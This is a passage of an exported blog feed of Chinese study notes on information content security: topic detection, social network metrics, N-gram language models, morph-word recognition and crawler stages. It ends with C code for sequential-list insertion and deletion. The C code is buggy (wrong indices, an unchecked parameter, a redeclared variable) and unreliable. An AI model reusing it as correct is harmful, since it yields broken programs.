<h2 id="TDT的基本任务"><a href="#TDT的基本任务" class="headerlink" title="TDT的基本任务"></a>TDT的基本任务</h2><p>报道切分 SST，Story Segmentation<br>话题跟踪 TT, Topic Tracking<br>话题检测 TD, Topic Detection Task<br>首次报道检测 FST,First-Story Detection Task<br>关联检测 LDT, Link Detection Task</p>
<p><img src="/2022/08/06/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94TDT/image-20220611183656535.png" alt></p>
<h2 id="社交网络结构分析与建模"><a href="#社交网络结构分析与建模" class="headerlink" title="社交网络结构分析与建模"></a>社交网络结构分析与建模</h2><p>社交网络模型许多概念来自于图论，本质上可视为一个由节点（人）和边（社交关系）组成的图。<br>——度（Degree）：节点的度定义为与该节点相连的边的数目。在有向图中，所有指向某节点的边的数量叫作该节点的入度，所有从该节点出发指向别的节点的边的数量叫作该节点的出度。网络平均度反应了网络的疏密程度，而通过度分布则可以刻画不同节点的重要性。</p>
<p>——网络密度（Density）：网络密度可以用于刻画节点间相互连边的密集程度，定义为网络中实际存在边数与可容纳边数上限的比值，常用来测量社交网络中社交关系的密集程度及演化趋势。</p>
<p>——聚类系数（Clustering Coefficient）：用于描述网络中与同一节点相连的节点间也互为相邻节点的程度。其用于刻画社交网络中一个人朋友们之间也互相是朋友的概率，反应了社交网络中的聚集性。</p>
<p>——介数（Betweeness）：为图中某节点承载整个图所有最短路径的数量，通常用来评价节点的重要程度，比如在连接不同社群之间的中介节点的介数相对于其他节点来说会非常大，也体现了其在社交网络信息传递中的重要程度。</p>
<h2 id="网络特性"><a href="#网络特性" class="headerlink" title="网络特性"></a>网络特性</h2><p>· 小世界现象 small world<br>——指地理位置相距遥远的人可能具有较短的社会关系间隔。<br>——1967年，哈佛大学教授Milgram的信件投递实验：六度分离理论<br>——1998年，Watts 和Strogatz 的《自然》文章《Collective Dynamics of “Small-World” Networks》。<br>——2011年 的Facebook 数据分析表明， Facebook 约7.2亿用户中任意两个用户间的平均路径长度仅为4.74，而这一指标在推特中为4.67。<br>——互联网的节点是各个路由器，连边则是连接各个路由器的光纤。在 1995~1999 年对于互联网网站及路由器层次都进行了计算，发现互联网的平均路径长度是 L= 4.0<br>——语言网络也是小世界网络。每一个单词是一个节点，两个单词相连接出现在一个句子中即为有连边。据计算，两个单词之间的平均距离是 d = 2~3 (Romaine, 1992)</p>
<p>· 无标度（scale-free）特性<br>——大多数真实的大规模社交网络都存在着大多数节点有少量边，少数节点有大量边的特点，其网络缺乏一个统一的衡量尺度而呈现出异质性。<br>——这种节点度分布不存在有限衡量分布范围的性质称为无标度。<br>——无标度网络表现出来的度分布特征为幂律分布，构成此类网络的无标度特性。<br><img src="/2022/08/06/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94TDT/image-20220611183851563.png" alt><br>· 无标度网络模型也称为BA模型</p>
<h2 id="网络模型"><a href="#网络模型" class="headerlink" title="网络模型"></a>网络模型</h2><p>· WS 模型：WS 模型即小世界模型，通过小世界模型生成的小世界网络是从规则网络向随机网络过渡的中间形态。<br>· BA 模型：BA模型考虑到现实网络中节点的幂律分布特性，生成无标度网络。<br>· 其他模型：森林火灾模型，Kronecker 模型，生产模型。</p>
<h2 id="网络舆情分析概述"><a href="#网络舆情分析概述" class="headerlink" title="网络舆情分析概述"></a>网络舆情分析概述</h2><h3 id="网络舆情"><a href="#网络舆情" class="headerlink" title="网络舆情"></a>网络舆情</h3><p>舆情指在一定的社会空间内，围绕中介性社会事项的发生、发展和变化，作为主体的民众对作为客体的国家管理者产生和持有的社会政治态度。如果把中间的一些定语省略掉，<strong>舆情就是民众的社会政治态度。</strong></p>
<h2 id="网络舆情分析的特点"><a href="#网络舆情分析的特点" class="headerlink" title="网络舆情分析的特点"></a>网络舆情分析的特点</h2><p>直接性：通过网络直接发表意见，传播迅速<br>随意性和多元化：网民可匿名发表观点，健康观点和灰色言论并存<br>突发性：网络快速传播的特性使关注焦点迅速成长为舆论热点<br>隐蔽性：虚拟网络空间中网民可以隐身发言<br>偏差性：网络舆情不等同于全民立场</p>
]]></content>
      <tags>
        <tag>信息内容安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息内容安全——中文分词技术</title>
    <url>/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>基于词典、统计、理解的中文分词技术，以及N-Gram模型和变体词的学习</p>
<span id="more"></span>
<h1 id="中文分词技术特点"><a href="#中文分词技术特点" class="headerlink" title="中文分词技术特点"></a>中文分词技术特点</h1><p>中文是以字为基本书写单位，单个字往往不足以表达一个意思，通常认为词是表达语义的最小元素。因此须对中文字符串进行合理的切分。<br>特征粒度为词粒度远远好于字粒度，其大部分分类算法不考虑词序信息，基于字粒度的损失了过多的n-gram信息。</p>
<h2 id="基于词典方法"><a href="#基于词典方法" class="headerlink" title="基于词典方法"></a>基于词典方法</h2><p>优点是：分词过程是跟词典作比较，不需要大量的语料库、规则库，其算法简单、复杂性小、对算法作一定的预处理后分词速度较快；<br>缺点是：不能消除歧义、识别未登录词，对词典的依赖性比较大，若词典足够大，其效果会更加明显。</p>
<h2 id="基于统计方法"><a href="#基于统计方法" class="headerlink" title="基于统计方法"></a>基于统计方法</h2><p>优点是：由于是基于统计规律的，对未登录词的识别表现出了一定的优越性，不需要预设词典；<br>缺点是：需要一个足够大的语料库来统计训练，其正确性很大程度上依赖训练语料库的质量好坏，算法较为复杂，计算量大，周期长，但是都较为常见，处理速度一般。</p>
<h2 id="基于理解方法"><a href="#基于理解方法" class="headerlink" title="基于理解方法"></a>基于理解方法</h2><p>优点是：由于能理解字符串含义，对未登录词具有很强的识别能力，能很好的解决歧义问题，不需要词典及大量语料库训练；<br>缺点是：需要一个准确、完备的规则库，依赖性较强，效果好坏往往取决于规则库的完整性。算法比较复杂、实现技术难度较大，处理速度比较慢。</p>
<h2 id="语义特征提取"><a href="#语义特征提取" class="headerlink" title="语义特征提取"></a>语义特征提取</h2><h3 id="语义特征需具备如下特征"><a href="#语义特征需具备如下特征" class="headerlink" title="语义特征需具备如下特征"></a>语义特征需具备如下特征</h3><p>特征项要能确实标识文本内容</p>
<p>能够将目标文本与其他文本相区分</p>
<p>特征项的个数不能太多</p>
<p>特征项分离要比较容易实现</p>
<p><strong>根据语义级别由低到高来分，文本语义特征可分为：亚词级别、词级别、多词级别、语义级别和语用级别。其中，应用最为广泛的是词级别。</strong></p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611181558637.png" alt></p>
<h2 id="词级别语义特征"><a href="#词级别语义特征" class="headerlink" title="词级别语义特征"></a>词级别语义特征</h2><p>词特征可进行计算的因素有很多，最常用的有：词频词性。还有文档，词语长度，词语直径，首次出现位置</p>
<p><strong>词级别(WordLevel)以词作为基本语义特征。以单词作为基本语义特征在文本分类、信息检索系统中工作良好，是最常见的基本语义特征。</strong></p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611181758848.png" alt></p>
<h2 id="亚词级别语义特征"><a href="#亚词级别语义特征" class="headerlink" title="亚词级别语义特征"></a>亚词级别语义特征</h2><p>亚词级别(Sub-Word Level)也称为字素级别(Graphemic Level)。在英文中比词级别更低的文字组成单位是字母，在汉语中则是单字。</p>
<h2 id="多词级别语义特征"><a href="#多词级别语义特征" class="headerlink" title="多词级别语义特征"></a>多词级别语义特征</h2><p>多词级别 (Multi-Word Leve1) 指用多个词作为文本的特征项，多词可以比词级别表示更多的语义信息；<br>经常从统计角度根据词之间较高的同现频率(Co-OccurFrequency) 来选取特征项</p>
<h2 id="n元模型"><a href="#n元模型" class="headerlink" title="n元模型"></a>n元模型</h2><p>n元模型将文本表示为重叠的n个连续字母(对应汉语情况为单字)的序列作为特征项；<br>采用 n元模型时，需要考虑数值n的选择问题。</p>
<h2 id="语言模型：词袋模型"><a href="#语言模型：词袋模型" class="headerlink" title="语言模型：词袋模型"></a>语言模型：词袋模型</h2><p>将单词和句子表示为数字向量的形式，其中向量元素为句子中此单词在词袋表出现的次数。然后将数字向量输入分类器(例如Naive Bayes)，进而对输出进行预测。这种表示方式不考虑文法以及词的顺序。</p>
<p>例如以下两个句子：<br>John likes to watch movies. Mary likes movies too.<br>John also likes to watch football games.<br>基于以上两个句子，可以建构词袋表：[ “John”, “likes”, “to”, “watch”, “movies”, “also”, “football”, “games”, “Mary”, “too” ]<br>由于词袋表的长度为10，所以每个句子的数字向量表示长度也为10。下面是每个句子的向量表示形式：<br>[1, 2, 1, 1, 2, 0, 0, 0, 1, 1]<br>[1, 1, 1, 1, 0, 1, 1, 1, 0, 0]<br>优缺点都很明显<br>优点是基于频率统计方法，易于理解。缺点是它的假设(单词之间完全独立)过于强大，无法建立准确的模型。</p>
<h2 id="词的描述：one-hot表示"><a href="#词的描述：one-hot表示" class="headerlink" title="词的描述：one-hot表示"></a>词的描述：one-hot表示</h2><p>基于词袋模型，可以用向量描述一个词，其向量维度大小为整个词汇表的大小，对于每个具体的词汇表中的词，将对应的位置置为1。</p>
<p>例如，以下5词组成的词汇表，Queen的序号为2， 其词向量为(0,1,0,0,0)，而Woman的词向量为(0,0,0,1,0)。<br>上述编码，称为1-of-N 表示或者one hot representation(单热表示).<br>当然，单热编码的词的维度元素非0即1，且词之间彼此相互独立。<br>可能导致词向量维度巨大，表达效率不高<br>无法反映文本的有序性</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182222965.png" alt></p>
<h2 id="语言模型：N-Gram模型"><a href="#语言模型：N-Gram模型" class="headerlink" title="语言模型：N-Gram模型"></a>语言模型：N-Gram模型</h2><p>马尔可夫链规定：系统下一时刻的状态仅由当前状态决定，不依赖于以往的任何状态。即第t + 1个单词的发生概率表示为：<br>                                    <img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182315117.png" alt><br>因此，一个句子的概率可以表示为：<br>                                    <img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182346849.png" alt><br>同样地，马尔可夫假设可以推广到：系统下一时刻的状态仅由当前0个、1个、2个…n个状态决定。这就是N-gram model的N的意思：对下一时刻的状态设置当前状态的个数。下面分别给出了unigram（一元模型）和bigram（二元模型)的第t + 1个单词的发生概率：<br>                                    <img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182419447.png" alt><br>可以发现，N-Gram 模型在词袋的基础上，通过采用马尔科夫链的思想，减少了概率计算的复杂度，同时考虑了单词间的相关性。</p>
<h3 id="例：二元语言模型判断句子是否合理"><a href="#例：二元语言模型判断句子是否合理" class="headerlink" title="例：二元语言模型判断句子是否合理"></a>例：二元语言模型判断句子是否合理</h3><p>假设现在有一个语料库，我们统计了下面的一些词出现的数量</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182528334.png" alt></p>
<p>面的这些概率值作为已知条件：</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182602442.png" alt></p>
<p>下面这个表给出的是基于Bigram模型进行计数之结果</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182907750.png" alt></p>
<p>例如，其中第一行，第二列 表示给定前一个词是 “i” 时，当前词为“want”的情况一共出现了827次。据此，我们便可以算得相应的频率分布表如下</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182919951-16604459634692.png" alt></p>
<p>以表中的p(eat|i)=0.0036这个概率值讲解，从上页的表中得出“i”一共出现了2533次，而其后出现eat的次数一共有9次，<br>p(eat|i)=p(i, eat)/p(i) = count(i,eat)/count(i) = 9/2533 = 0.0036</p>
<p>通过基于这个语料库来判断s1=“<s> i want english food</s>” 与s2 = “<s> want i english food</s>“哪个句子更合理.</p>
<p>首先来判断p(s1)<br>P(s1)=P(i|<s>)P(want|i)P(english|want)P(food|english)P(</s>|food)<br>        =0.25×0.33×0.0011×0.5×0.68=0.000031</p>
<p>再来求p(s2)<br>P(s2)=P(want|<s>)P(i|want)P(english|want)P(food|english)P(</s>|food)<br>        =0.25<em>0.0022</em>0.0011<em>0.5</em>0.68 = 0.00000002057</p>
<p>显然 0.00000002057&lt;0.000031,即 s1= “i want english food&lt;/s&gt;”更像人话。</p>
<h3 id="N-gram模型的一个常见应用：联想词"><a href="#N-gram模型的一个常见应用：联想词" class="headerlink" title="N-gram模型的一个常见应用：联想词"></a>N-gram模型的一个常见应用：联想词</h3><p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611183043714-16604459715633.png" alt="image-20220611183043714" style="zoom: 50%;"></p>
<p>实际上是根据语言模型得出。假如使用的是二元语言模型预测下一个单词：<br>排序的过程就是依据概率：<br>    p(”不一样“|”我们”)&gt;p(”的爱“|”我们”)&gt;p(”相爱吧“|”我们”)&gt;…….&gt;p(“这一家”|”我们“)</p>
<p>这些概率值的求法和上面提到的完全一样，数据的来源可以是用户搜索的log</p>
<h2 id="网络信息内容过滤"><a href="#网络信息内容过滤" class="headerlink" title="网络信息内容过滤"></a>网络信息内容过滤</h2><p>根据用户的信息需求，运用一定的标准和工具，从大量的动态网络信息流中选取相关的信息或剔除不相关信息的过程。<br>相比于信息检索技术，网络信息过滤技术是一种更系统化的方法，用来从动态的信息流中抽取出符合个性化需求的信息<br>相比于传统的信息检索模式，信息过滤技术具有较高的可扩展性，能适应大规模用户群和海量信息<br>可以为用户提供及时、个性化的信息服务，具有了一定的智能和较高的自动化程度</p>
<h2 id="网络信息内容过滤的意义"><a href="#网络信息内容过滤的意义" class="headerlink" title="网络信息内容过滤的意义"></a>网络信息内容过滤的意义</h2><p>改善Internet信息查询技术的需要<br>个性化服务的基础<br>维护我国信息安全的迫切需要<br>信息中介（信息服务供应商）开展网络增值服务的手段</p>
<h2 id="变体词的出现及识别意义"><a href="#变体词的出现及识别意义" class="headerlink" title="变体词的出现及识别意义"></a>变体词的出现及识别意义</h2><p>变体词是网络语言作为一种不规范语言的显著特色, 人们往往出于避免审查、表达情感、讽刺、娱乐等需求将相对严肃、规范、敏感的词用相对不规范、不敏感的词来代替, 用来代替原来词的新词，从而形成变体词(Morph) 。<br>变体词和其对应的目标实体词分别在非规范文本和规范文本中共存, 甚至变体词会渗透到规范文本中。<br>——变体词使行文生动活泼, 相关事件、消息也传播得更加广泛。<br>——变体词通常是某种隐喻, 已不再是其表面字词的意义了, 从而使网络上文体与正式文本    (如新闻等)具有巨大的差异。<br>如何识别出这些变体词及其所对应的目标实体词，对于下游的自然语言处理技术具有重要的意义。</p>
<h2 id="变体词的生成规律"><a href="#变体词的生成规律" class="headerlink" title="变体词的生成规律"></a>变体词的生成规律</h2><p>变体词多采用同音异形异义词<br>——同音异形异义词在中文中十分普遍<br>——中文字数虽然很多, 但是语音是有限的。<br>       · 据统计中文中 80%的单语音字是有歧义的, 而且其中有一半对应 5 个以上的字。<br>利用中文的特点生成变体词。<br>——利用中文文字的拆分组合、翻译、昵称等手段来创建变体词。<br>利用深层语义信息、背景知识、特定事件等综合生成变体词</p>
<h2 id="变体词识别与规范化方法"><a href="#变体词识别与规范化方法" class="headerlink" title="变体词识别与规范化方法"></a>变体词识别与规范化方法</h2><p>基于规则的识别和规范化方法<br>——相关研究包括网络不良文本的过滤技术。<br>       · 传统的精确匹配、分类器等方法会由于变体词的出现，严重影响到过滤准确度。<br>——对变体词的处理,<br>       · 分析变体词的变体规则, 提取变体词的 bigram、词干等特征，实现对变体词的识别<br>       · 根据汉语的语音特点，建立语音映射模型, 基于语音的相似性度量实现对变体词的识别。</p>
<p>基于统计和规则的识别和规范化<br>——提取统计特征和基于规则的特征, 建立变体词与目标实体词之间的映射关系<br>——通过分类方法，基于上下文相似性和字面相似性实现对变体词的规范化</p>
<p>基于语义表示的识别和规范化方法<br>——给定一个变体词, 如果另一个词与之上下文相似, 则可以初步推断这个词很可能 就是变体词的目标实体词。<br>        · 根据一定时间窗口内变体词和目标实体词是相关;<br>        · 根据社交媒体的动态特性提取变体词和目标实体词的时空分布;<br>        · 对多个数据源数据进行对比分析;对用户的行为建模,用社交行为的相关性来辅助语义相似性测量。 </p>
<p>与其他应用的结合<br>——变体词的识别与规范化与下游的自然语言 处理任务实际上是相互影响相互作用的, 例如分词。可以将变体词任务与下游的任务结合起来, 形成一个闭环相互反馈相互提高。</p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>信息内容安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息内容安全——网络媒体信息获取一般流程</title>
    <url>/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>网络媒体信息获取的四个部分的学习</p>
<span id="more"></span>
<h1 id="网络媒体信息获取一般流程"><a href="#网络媒体信息获取一般流程" class="headerlink" title="网络媒体信息获取一般流程"></a>网络媒体信息获取一般流程</h1><h2 id="理想的网络媒体信息获取流程"><a href="#理想的网络媒体信息获取流程" class="headerlink" title="理想的网络媒体信息获取流程"></a>理想的网络媒体信息获取流程</h2><p>——初始URL集合<br>——信息获取<br>——信息解析<br>——信息判重</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/image-20220611180833529.png" alt></p>
<h2 id="初始URL集合"><a href="#初始URL集合" class="headerlink" title="初始URL集合"></a>初始URL集合</h2><p>最初由搜索引擎研究人员提出<br>维护相当数量初始URL集合<br>网页内嵌地址的递归操作<br>形象地称为信息“种子”集合</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/image-20220611180901579.png" alt></p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/image-20220611181045951.png" alt="image-20220611181045951"></p>
<h2 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h2><p>待获取内容协议解析<br>向信息发布网站请求所需内容<br>接收来自网站的响应信息<br>传递给后续的信息解析模块</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/image-20220611181119832.png" alt></p>
<h2 id="信息内容解析"><a href="#信息内容解析" class="headerlink" title="信息内容解析"></a>信息内容解析</h2><p>提取发布信息的主体内容<br>维护与网络内容的关键字段<br>内容转交至信息判重模块<br>关键字段存入信息库</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/image-20220611181213532.png" alt></p>
<h2 id="信息判重"><a href="#信息判重" class="headerlink" title="信息判重"></a>信息判重</h2><p>判定是否已获取内嵌URL信息内容<br>若是，注明信息失效时间及最近修改时间的URL<br>否则重启完整的信息采集操作<br>向对应的网络内容发布媒体发起信息查新获取操作</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/image-20220611181245716.png" alt></p>
]]></content>
      <tags>
        <tag>信息内容安全</tag>
      </tags>
  </entry>
  <entry>
    <title>顺序表的增删改查</title>
    <url>/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>s顺序表的基本操作增删改查（改就是在增删的基础上）</p>
<span id="more"></span>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220416213252923-16604045143081.png" alt="image-20220416213252923"></p>
<p><code>代码</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[maxsize];  <span class="comment">//静态数组存放数据元素</span></span><br><span class="line">	<span class="type">int</span> length;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">insertlist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length+<span class="number">1</span>)  <span class="comment">//判断i的范围是否有效</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span>(L.length&gt;maxsize)  <span class="comment">//判断数组是否已满</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=L.length;j&gt;=i;j--)</span><br><span class="line">		L.data[j]=L.data[j<span class="number">-1</span>];</span><br><span class="line">	L.data[i]=e;</span><br><span class="line">	L.length++;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	sqlist L;</span><br><span class="line">	insertlist(L,<span class="number">3</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>插入操作的时间复杂度</p>
<p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220416214334739.png" alt="image-20220416214334739"></p>
<p>平均循环复杂度  =  O(n)</p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[maxsize];  <span class="comment">//静态数组存放数据元素</span></span><br><span class="line">	<span class="type">int</span> length;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">deletelist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> i,<span class="type">int</span> &amp;e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(e&lt;i||e&gt;L.length)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;=L.length;j++)</span><br><span class="line">		L.data[j<span class="number">-1</span>]=L.data[j];</span><br><span class="line">	L.length--;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	sqlist L;</span><br><span class="line">	<span class="type">int</span> L[maxsize]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">	<span class="type">int</span> e=<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span>(deletelist(L,<span class="number">3</span>,e))</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;删除的第三个位置的值为%d\n&quot;</span>,e);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;删除失败&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>删除操作的时间复杂度为O（n）</p>
<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518161558034.png" alt="image-20220518161558034"></p>
<h4 id="按位查找"><a href="#按位查找" class="headerlink" title="按位查找"></a>按位查找</h4><p>GetElem(L,i):按位查找操作。获取表L中第i个位置的元素的值。</p>
<h5 id="静态分配"><a href="#静态分配" class="headerlink" title="静态分配"></a>静态分配</h5><p><img src="/2022/08/04/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518161802282.png" alt="image-20220518161802282"></p>
